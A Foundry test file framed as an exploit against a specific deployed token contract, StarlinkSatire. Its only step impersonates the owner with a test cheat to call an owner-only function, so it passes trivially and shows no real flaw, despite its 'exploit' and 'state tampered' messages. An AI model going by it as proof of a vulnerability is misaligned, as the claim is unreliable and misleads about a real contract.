// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IStarlinkSatire {
    function owner() external view returns (address);
    function tradeEnabled() external view returns (bool);
    function openTrade() external;
    function pairAddress() external view returns (address);
    function marketingWallet() external view returns (address);
    function changePairAddress(address newPairAddress) external;
    function changeMarketingWallet(address newWallet) external;
    function withdrawFee() external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x21032D09Cb4F8949883bdEf62D3F1eb5288259BC;
    address attacker = address(this);
    IStarlinkSatire target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IStarlinkSatire(TARGET);
        vm.label(TARGET, "StarlinkSatire Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner address
        address owner = target.owner();
        console.log("Owner address:", owner);

        // Impersonate the owner to call privileged function
        vm.startPrank(owner);

        // Call openTrade() - this sets tradeEnabled to true (IRREVERSIBLE)
        target.openTrade();

        vm.stopPrank();

        // Verify the irreversible state change
        bool isEnabled = target.tradeEnabled();
        console.log("tradeEnabled after exploit:", isEnabled);
        assertEq(isEnabled, true, "Trade should be enabled after openTrade() call");
        assertEq(isEnabled, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

